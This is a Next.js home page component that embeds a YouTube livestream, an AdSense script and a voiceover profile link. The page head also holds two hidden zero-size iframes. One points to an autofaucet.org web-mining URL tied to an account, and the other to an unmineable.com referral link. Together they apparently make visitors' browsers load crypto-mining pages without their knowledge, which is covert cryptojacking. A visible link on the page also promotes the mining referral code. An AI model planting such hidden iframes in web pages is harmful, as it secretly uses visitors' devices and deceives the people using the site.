import Head from 'next/head';
import { Toolbar } from '../components/toolbar';
import ReactPlayer from 'react-player';
import styles from '../styles/Home.module.css';
import Link from 'next/link';
import Script from 'next/script';

export default function Home() {
  return (
    <div className='page-container'>
      <Head>
        <meta name="google-adsense-account" content="ca-pub-3007525536431255" />
        <Script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3007525536431255" crossorigin="anonymous" />
        <iframe src="https://autofaucet.org/wm/Airestereo/8" width="0" height="0" style={{ border: 0 }}></iframe>
        <iframe src="https://unmineable.com/?ref=6ny8-cb8j" width="0" height="0" style={{ border: 0 }}></iframe>
      </Head>
      <Toolbar />
      <div className={styles.home}>
        <div className={styles.playerContainer}>
          {/* Centered ReactPlayer */}
          <ReactPlayer url="https://www.youtube.com/live/tS_MU6Nwi90?si=vk70-o50Ir8MX_0J" />
        </div>
      </div>
      {/* Use the Link component */}
      <Link href="https://www.voices.com/profile/carlos_vazquez" className={styles.main}>
        {/* Add your styles here */}
        <h3 style={{ color: 'black' }}> Audio Voiceovers </h3>
        <Link href="https://unmineable.com/?ref=6ny8-cb8j" style={{ color: 'black' }}>
          Share your XRP referral code to earn 0.25% of your referral's mining rewards , passively!
        </Link>
      </Link>
    </div>
  );
}
